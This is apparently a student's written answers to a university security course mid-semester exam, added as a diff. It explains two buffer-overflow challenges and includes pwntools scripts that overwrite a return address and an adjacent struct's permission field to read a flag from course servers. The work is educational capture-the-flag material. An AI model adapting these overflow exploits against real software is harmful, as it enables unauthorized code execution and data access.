@@ -1,0 +1,45 @@
+COMP 6447 Mid Sem
+Johnathan Liauw (z5136212)
+
+Question 1: 
+Reversing the binary, I found that the first input is compared char by char and the password is "l33t", then the second input is useless since I cannot overflow it, the third input can be overflowed and then I used a cyclic pattern to find its offset to the return address, using that I replaced the return address with the print_flag function address and got the flag.
+
+Script used for q1:
+#!/usr/bin/python
+
+from pwn import *
+
+offset = 13
+flag = 0x08048668
+c = remote("midsem.6447.sec.edu.au", 8011)
+
+c.sendline("l33t")
+c.sendline("a")
+
+payload = "a"*offset + p32(flag)
+
+c.sendline(payload)
+
+c.interactive()
+
+Question 2:
+
+Question 3: 
+Reversing the binary, I found that I can overflow the input for the title and content, I also found that there is an article structure where the first 4 bytes is a permission so to read the flag I have to change its permission to 1. Then I found that the offset to overwrite is 300 through the assembly. There is something like an array of articles so to overwrite the flag article which is article 9, I will overwrite the content of article 8, changing the permission of article and the read the flag in it.
+
+Script used for q3:
+#!/usr/bin/python
+
+from pwn import *
+
+c = remote("midsem.6447.sec.edu.au", 8031)
+
+c.sendline("c")
+c.sendline("8")
+c.sendline("a")
+payload = "a"*300 + p32(1)
+c.sendline(payload)
+c.sendline("b")
+c.sendline("9")
+
+c.interactive()
